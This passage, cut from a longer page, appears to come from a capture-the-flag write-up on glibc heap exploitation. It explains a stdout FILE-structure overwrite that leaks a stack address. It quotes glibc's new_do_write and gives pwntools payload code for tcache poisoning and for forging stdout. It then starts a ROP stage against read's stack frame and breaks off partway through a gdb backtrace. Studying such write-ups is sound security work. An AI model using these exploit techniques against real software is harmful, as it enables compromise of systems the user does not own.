operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_wide_data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Our mode is negative (you can confirm in gdb via \",(0,n.jsx)(e.code,{children:\"p *stdout\"}),\"), so it\\u2019ll call \",(0,n.jsx)(e.code,{children:\"_IO_do_write\"}),\". This is a macro for \",(0,n.jsx)(e.code,{children:\"new_do_write\"}),\", which is great! The flush macro is all we needed to get to, rather than worrying about newlines. Now, let\\u2019s inspect this write code to see what else we need to set up:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"static\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"new_do_write\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FILE \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"const\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),\" to_do\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),\" count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\" _IO_IS_APPENDING\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:`/* On a system without a proper O_APPEND implementation,\n`})]}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`       you would need to sys_seek(0, SEEK_END) here, but is\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`       not needed nor desirable for Unix- or Posix-like systems.\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`       Instead, just indicate that offset (before and after) is\n`})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"       unpredictable. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_offset \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" _IO_pos_BAD\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"off64_t\"}),` new_pos\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_SYSSEEK\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"new_pos \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" _IO_pos_BAD\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_offset \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" new_pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  count \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_SYSWRITE\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" to_do\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_cur_column \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&&\"}),\" count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_cur_column \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_adjust_column\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_cur_column \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_setg\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_mode \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t       \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&&\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_IO_LINE_BUF \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"|\"}),\" _IO_UNBUFFERED\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t       \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"?\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" fp\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Alright, the call we need to get to is \",(0,n.jsx)(e.code,{children:\"_IO_SYSWRITE\"}),\". This will finally write whatever we set our buffer. \",(0,n.jsx)(e.em,{children:\"But,\"}),\" we should avoid \",(0,n.jsx)(e.code,{children:\"IO_SYSSEEK\"}),\", since seeking on stdout is undefined. The simplest way is just to add \",(0,n.jsx)(e.code,{children:\"_IO_IS_APPENDING\"}),\" to our flags, which bypasses it completely (The other method is to make \",(0,n.jsx)(e.code,{children:\"read_end==write_base\"}),\", which can be easily setup if necessary).\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Finally, we need to make sure that we don\\u2019t break \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" in the future, since we plan to move it\\u2019s read and write buffers onto the stack, instead of libc. After it writes, it sets the \",(0,n.jsx)(e.code,{children:\"write_base\"}),\" and \",(0,n.jsx)(e.code,{children:\"write_ptr\"}),\" to \",(0,n.jsx)(e.code,{children:\"_buf_base\"}),\", and it sets \",(0,n.jsx)(e.code,{children:\"write_end\"}),\" to either \",(0,n.jsx)(e.code,{children:\"_buf_base\"}),\" or \",(0,n.jsx)(e.code,{children:\"_buf_end\"}),\", depending on the \",(0,n.jsx)(e.code,{children:\"_IO_LINE_BUF\"}),\" or \",(0,n.jsx)(e.code,{children:\"_IO_UNBUFFERED\"}),\" flag.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"So, we\\u2019re ready to write to the \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" file pointer:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Set \",(0,n.jsx)(e.code,{children:\"stdout->flags = _IO_MAGIC | (~_IO_NO_WRITES) | IO_IS_CURRENTLY_PUTTING | _IO_IS_APPENDING\"})]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Set \",(0,n.jsx)(e.code,{children:\"stdout->_IO_write_base\"}),\" to \",(0,n.jsx)(e.code,{children:\"&environ\"}),\", to make that our buffer.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Set \",(0,n.jsx)(e.code,{children:\"stdout->_IO_write_ptr = stdout->_IO_write_end = _IO_buf_end\"}),\" to be \",(0,n.jsx)(e.code,{children:\"&environ+8\"}),\", to make our buffer non zero and just print out the stack leak.\"]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"The full payload is assembled:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfbad1800\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#flags\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#read_ptrs, dont matter\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#write_base\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#write_ptr and end\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# buf_base\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# buf_end\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Again, thanks to ret2school for detailing this. What were we doing? Right, stack leak\"}),`\n`,(0,n.jsx)(e.p,{children:\"Now, we can get the stack:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#symbols\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'environ'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stdout \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'_IO_2_1_stdout_'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# prior botcake exploit, we make the next chunk return the location of stdout\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stdout \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We write out stdout payload\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfbad1800\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:'# When printf(\"> \") happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"fsop-i-like-rop-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#fsop-i-like-rop-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"FSOP? I Like ROP. \",(0,n.jsx)(\"a\",{name:\"rop\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"With a proper stack address, we can now forge a chunk to be given to us located within the stack, and overwrite return pointers to hijack control flow. Ah... but \",(0,n.jsx)(e.em,{children:\"where\"}),\"? The main function doesn\\u2019t actually return, it exits. What we can do is kind of silly, but instead of overwriting main\\u2019s stack frame, we\\u2019ll overwrite the stack frame of whatever lib function calls \",(0,n.jsx)(e.code,{children:\"read()\"}),\". That way, when we return from the read call after allocing a chunk, we instead return to our own control flow.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"If we look at gdb, we can see our backtrace up to the read call:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\\u25BA f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0f14992\"}),\" read\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"18\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0e8ccb6\"}),\" _IO_file_underflow\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"390\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0e8de16\"}),\" _IO_default_uflow\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"54\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0e63150\"}),\" __vfscanf_internal\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1776\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f 